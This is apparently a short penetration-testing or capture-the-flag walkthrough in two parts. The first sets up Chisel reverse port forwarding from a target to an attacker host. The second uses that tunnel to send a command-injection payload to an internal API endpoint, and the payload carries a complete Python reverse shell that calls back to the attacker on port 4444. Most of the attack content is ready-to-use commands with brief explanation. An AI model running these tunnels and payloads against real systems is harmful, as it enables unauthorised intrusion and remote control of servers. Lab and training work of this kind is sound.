# Chisel Port Forwarding

### Attacker Machine

Start the Chisel server:

```bash
./chisel server -p 8000 --reverse
```

* `-p 8000` → Chisel listens on port `8000`.
* `--reverse` → enables reverse port forwarding.

### Target Machine

Connect the target to the attacker:

```bash
./chisel client 192.168.132.217:8000 \
R:3000:127.0.0.1:3000 \
R:9000:127.0.0.1:9000 \
R:8080:127.0.0.1:8080
```

`R:<port>:<target>:<port>` creates a reverse tunnel.

For example:

```text
R:9000:127.0.0.1:9000
```

allows:

```text
Attacker:9000 → Target:127.0.0.1:9000
```

This allows us to access services running only on the target's localhost.

---

# Command Injection

Access the internal API through the Chisel tunnel:

```bash
curl 127.0.0.1:9000/jobs/export -X POST \
  -H 'Authorization: Bearer <automation key>' \
  -H 'Content-Type: application/json' \
  -d '{"report":"x;python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<tun0 ip>\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"sh\\\")\""}'
```

The `report` parameter contains a **command injection** payload.

The `;` separates the original command from the injected Python command.

The Python code:

```text
Target → 192.168.132.217:4444
```

creates a reverse connection to the attacker and redirects the shell's input/output to that connection.

### Attack Flow

```text
Chisel Tunnel
     ↓
Internal API :9000
     ↓
Command Injection
     ↓
Python Reverse Shell
     ↓
Attacker :4444
```
